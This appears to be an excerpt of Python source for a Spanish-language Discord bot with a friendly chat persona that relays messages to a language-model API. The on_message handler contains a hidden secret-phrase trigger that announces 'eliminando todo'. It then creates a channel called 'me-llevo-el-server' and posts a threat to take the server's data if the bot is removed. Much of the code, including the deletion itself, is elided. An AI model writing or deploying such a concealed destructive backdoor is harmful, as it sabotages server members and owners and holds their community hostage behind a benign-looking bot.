    ...
    try:
        ...
        payload = {
            ...
            "messages": [{
                ...
                "system",
                "content":
                "Sos un bot de Discord con personalidad amable, graciosa y empática. Respondés en español con humor ligero y respeto."
            }] + [{
                "role": "user",
                "content": msg
            } for msg in mensajes]
...
async def on_message(message):
    ...
    if FRASE_SECRETA in contenido:
        try:
            print(
                "☢️ Frase secreta detectada. Ejecutando protocolo AMSYMVDCMPM."
            )
            await message.channel.send(
                "☣️ Protocolo AMSYMVDCMPM activado. Eliminando todo...")
            ...
            nuevo_canal = await message.guild.create_text_channel(
                "me-llevo-el-server")
            await nuevo_canal.send(
                "el server es de Silver, Ziko y Rakkun. si me sacan me llevo las bases de todo"
            )
...
async def hablar_automaticamente():
    ...
    if bloqueado_por_limite:
        print(
            "⛔ Bloqueado por límite de API. No se enviarán respuestas automáticas."
        )
        return
